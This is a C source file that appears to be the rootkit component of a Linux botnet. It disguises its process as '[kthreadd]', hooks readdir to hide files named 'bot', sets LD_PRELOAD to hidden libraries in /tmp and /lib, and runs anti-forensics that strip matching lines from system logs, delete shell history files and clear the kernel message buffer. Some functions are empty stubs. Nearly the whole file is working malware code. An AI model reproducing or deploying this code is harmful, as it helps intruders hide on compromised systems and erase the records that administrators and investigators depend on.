#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include "includes.h"
#include "rootkit.h"
#include "util.h"
#include "table.h"
static char process_name[256] = {0};
static char hidden_files[10][256];
static uint32_t hidden_file_count = 0;
static BOOL rootkit_installed = FALSE;
void rootkit_hide_process(void)
{
    char self_path[256];
    char new_name[256];
    snprintf(new_name, sizeof(new_name), "[kthreadd]");
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if(len > 0) {
        self_path[len] = 0;
        prctl(PR_SET_NAME, new_name, 0, 0, 0);
    }
}
static int (*original_readdir)(DIR *dirp) = NULL;
static struct dirent *(*original_readdir64)(DIR *dirp) = NULL;
struct dirent *readdir_hook(DIR *dirp)
{
    struct dirent *entry;
    if(!original_readdir64) {
        original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    }
    do {
        entry = original_readdir64(dirp);
        if(!entry) break;
        BOOL hidden = FALSE;
        for(uint32_t i = 0; i < hidden_file_count; i++) {
            if(strstr(entry->d_name, hidden_files[i])) {
                hidden = TRUE;
                break;
            }
        }
        if(!hidden) break;
    } while(1);
    return entry;
}
static FILE *(*original_fopen)(const char *path, const char *mode) = NULL;
FILE *fopen_hook(const char *path, const char *mode)
{
    if(!original_fopen) {
        original_fopen = dlsym(RTLD_NEXT, "fopen");
    }
    if(strstr(path, "/proc/net/tcp") || strstr(path, "/proc/net/udp")) {
    }
    return original_fopen(path, mode);
}
void rootkit_setup_ldpreload_hooks(void)
{
    char hook_lib_path[512];
    const char *possible_paths[] = {
        "/tmp/.libhook.so",
        "/usr/lib/.libhook.so",
        "/lib/.libhook.so",
        NULL
    };
    for(int i = 0; possible_paths[i]; i++) {
        if(access(possible_paths[i], F_OK) == 0) {
            snprintf(hook_lib_path, sizeof(hook_lib_path), "%s", possible_paths[i]);
            setenv("LD_PRELOAD", hook_lib_path, 1);
            return;
        }
    }
}
void rootkit_anti_forensics(void)
{
    const char *log_files[] = {
        "/var/log/messages",
        "/var/log/syslog",
        "/var/log/auth.log",
        "/var/log/secure",
        "/var/log/wtmp",
        "/var/log/utmp",
        NULL
    };
    for(int i = 0; log_files[i]; i++) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "sed -i '/bot\\|malware\\|suspicious/d' %s 2>/dev/null", log_files[i]);
        system(cmd);
    }
    const char *home = getenv("HOME");
    if(home) {
        char hist_path[512];
        snprintf(hist_path, sizeof(hist_path), "%s/.bash_history", home);
        unlink(hist_path);
        snprintf(hist_path, sizeof(hist_path), "%s/.zsh_history", home);
        unlink(hist_path);
        snprintf(hist_path, sizeof(hist_path), "%s/.history", home);
        unlink(hist_path);
    }
    system("dmesg -C 2>/dev/null");
    system("lastlog -u $(whoami) 2>/dev/null");
}
void rootkit_install_syscall_hooks(void)
{
}
void rootkit_init(void)
{
    if(rootkit_installed) return;
    rootkit_hide_process();
    strncpy(hidden_files[hidden_file_count++], ".bot", sizeof(hidden_files[0]) - 1);
    strncpy(hidden_files[hidden_file_count++], "bot", sizeof(hidden_files[0]) - 1);
    rootkit_installed = TRUE;
}
void rootkit_hide_files(void)
{
}
void rootkit_hide_network(void)
{
}
void rootkit_install_ldpreload(void)
{
    rootkit_setup_ldpreload_hooks();
}
